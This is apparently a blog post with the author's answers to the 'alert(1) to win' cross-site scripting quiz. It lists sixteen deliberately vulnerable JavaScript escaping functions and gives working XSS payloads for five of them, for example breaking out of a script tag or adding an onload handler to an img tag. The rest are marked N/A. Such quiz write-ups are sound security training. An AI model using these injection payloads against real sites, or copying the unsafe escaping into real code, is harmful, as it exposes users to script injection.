---
layout: post
title: "Answers for "alert(1) to win" quiz"
description: ""
category: "technical"
tags: [quiz, alert to win, javascript]
---
{% include JB/setup %}

I happen to know the ["alert(1) to win"](http://escape.alf.nu/) quiz. The quiz is quite outstanding.

Here is my answers so far. I hide them by default. Select text to see the hidden text.

NOTE: Don't read my answers unless you are really sure to read it. Try it yourself if possible.

### Quiz 0 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Warmup.

      return '<script>console.log("'+s+'");</script>';
    }
    
My answer:

<pre style="background-color: #FAFAFA; color: #FAFAFA">"+alert(1)+"</pre>

### Quiz 1 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Escaping scheme courtesy of Adobe Systems, Inc.
      s = s.replace(/"/g, '\\"');
      return '<script>console.log("' + s + '");</script>';
    }

My answer:

<pre style="background-color: #FAFAFA; color: #FAFAFA">&lt;/script>&lt;script>alert(1)&lt;/script></pre>

### Quiz 2 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      s = JSON.stringify(s);
      return '<script>console.log(' + s + ');</script>';
    }

My answer:

<pre style="background-color: #FAFAFA; color: #FAFAFA">&lt;/script>&lt;script>alert(1)&lt;/script></pre>

### Quiz 3 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
      console.log(url);
    
      var a = document.createElement('a');
      a.href = url;
      document.body.appendChild(a);
      a.click();
    }

My answer:

<pre style="background-color: #FAFAFA; color: #FAFAFA">%22+alert(1)+%22</pre>

### Quiz 4 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
      // URLs
      text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
      // [[img123|Description]]
      text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
      return text;
    }

My answer:

<pre style="background-color: #FAFAFA; color: #FAFAFA">[[1|"" onload=alert(1) ]]</pre>

### Quiz 5 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Level 4 had a typo, thanks Alok.
      // If your solution for 4 still works here, you can go back and get more points on level 4 now.
    
      var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
      // URLs
      text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
      // [[img123|Description]]
      text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
      return text;
    }

My answer:

N/A

### Quiz 6 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Slightly too lazy to make two input fields.
      // Pass in something like "TextNode#foo"
      var m = s.split(/#/);
    
      // Only slightly contrived at this point.
      var a = document.createElement('div');
      a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
      return a.innerHTML;
    }

My answer:

N/A

### Quiz 7 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Pass inn "callback#userdata"
      var thing = s.split(/#/); 
    
      if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
      var obj = {'userdata': thing[1] };
      var json = JSON.stringify(obj).replace(/</g, '\\u003c');
      return "<script>" + thing[0] + "(" + json +")</script>";
    }

My answer:

N/A

### Quiz 8 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Courtesy of Skandiabanken
      return '<script>console.log("' + s.toUpperCase() + '")</script>';
    }

My answer:

N/A

### Quiz 9 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // This is sort of a spoiler for the last level :-)
    
      if (/[\\<>]/.test(s)) return '-';
    
      return '<script>console.log("' + s.toUpperCase() + '")</script>';
    }

My answer:

N/A

### Quiz 10 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      function htmlEscape(s) {
        return s.replace(/./g, function(x) {
           return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
         });
      }
    
      function expandTemplate(template, args) {
        return template.replace(
            /{(\w+)}/g, 
            function(_, n) { 
               return htmlEscape(args[n]);
             });
      }
      
      return expandTemplate(
        "                                                \n\
          <h2>Hello, <span id=name></span>!</h2>         \n\
          <script>                                       \n\
             var v = document.getElementById('name');    \n\
             v.innerHTML = '<a href=#>{name}</a>';       \n\
          <\/script>                                     \n\
        ",
        { name : s }
      );
    }

My answer:

N/A

### Quiz 11 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Spoiler for level 2
      s = JSON.stringify(s).replace(/<\/script/gi, '');
    
      return '<script>console.log(' + s + ');</script>';
    }

My answer:

N/A

### Quiz 12 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      // Pass inn "callback#userdata"
      var thing = s.split(/#/); 
    
      if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
      var obj = {'userdata': thing[1] };
      var json = JSON.stringify(obj).replace(/\//g, '\\/');
      return "<script>" + thing[0] + "(" + json +")</script>";
    }

My answer:

N/A

### Quiz 13 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      var tag = document.createElement('iframe');
    
      // For this one, you get to run any code you want, but in a "sandboxed" iframe.
      //
      // http://print.alf.nu/?html=... just outputs whatever you pass in.
      //
      // Alerting from print.alf.nu won't count; try to trigger the one below.
    
      s = '<script>' + s + '<\/script>';
      tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);
    
      window.WINNING = function() { youWon = true; };
    
      tag.onload = function() {
        if (youWon) alert(1);
      };
      document.body.appendChild(tag);
    }

My answer:

N/A

### Quiz 14 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
      function html(s) { return s.replace(/[<>"&]/g, function(s) {
                            return '&#' + s.charCodeAt(0) + ';'; }); }
    
      return (
        '<script>' +
          'var url = ' + json(s) + '; // We\'ll use this later ' +
        '</script>\n\n' +
        '  <!-- for debugging -->\n' +
        '  URL: ' + html(s) + '\n\n' +
        '<!-- then suddenly -->\n' +
        '<script>\n' +
        '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
        '  else new Image().src = url;\n' +
        '</script>'
      );
    }

My answer:

N/A

### Quiz 15 ###

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

    function escape(s) {
      return s.split('#').map(function(v) {
          // Only 20% of slashes are end tags; save 1.2% of total
          // bytes by only escaping those.
          var json = JSON.stringify(v).replace(/<\//g, '<\\/');
          return '<script>console.log('+json+')</script>';
          }).join('');
    }

My answer:

N/A